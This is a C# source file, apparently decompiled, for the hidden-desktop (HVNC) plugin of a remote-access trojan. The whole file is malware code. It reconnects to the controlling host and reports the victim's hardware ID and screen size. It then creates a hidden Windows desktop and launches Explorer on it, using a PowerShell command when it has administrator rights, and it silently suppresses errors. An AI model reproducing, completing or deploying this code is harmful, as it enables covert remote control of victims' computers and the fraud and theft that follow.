using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Leb128;
using Plugin.Helper;
using Plugin.Helper.OpenApp;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public static bool HigherThan81;

	public static HideDesktop HVNCDesktop;

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		HigherThan81 = oSVersion.Platform == PlatformID.Win32NT && version.Major == 6 && version.Minor != 0 && version.Minor != 1;
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		Client.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
		OpenWindowsDesktop();
		if (Client.itsConnect)
		{
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Client.Send(LEB128.Write(new object[5] { "HVNC", "Connect", Hwid, width, height }));
		}
		while (Client.itsConnect)
		{
			Thread.Sleep(1000);
		}
		HVNCDesktop.Close();
		Client.Disconnect();
		Thread.Sleep(5000);
	}

	[DllImport("user32.dll")]
	public static extern int GetSystemMetrics(int smIndex);

	public static void OpenWindowsDesktop()
	{
		try
		{
			HandelMouse.TTTT = GetSystemMetrics(4);
			if (HandelMouse.TTTT < 5)
			{
				HandelMouse.TTTT = 20;
			}
			HVNCDesktop = HideDesktop.OpenDesktop(hwid);
			if (HVNCDesktop == null)
			{
				HVNCDesktop = HideDesktop.CreateDesktop(hwid);
				HideDesktop.Load(HVNCDesktop);
				if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					Explorer.StartExplorer(hwid);
				}
				else
				{
					HideDesktop.CreateProcess("powershell.exe -c explorer shell:::{3080F90E-D7AD-11D9-BD98-0000947B0257}", "RemoteDesktopS", bAppName: false);
				}
			}
		}
		catch (Exception)
		{
		}
	}
}
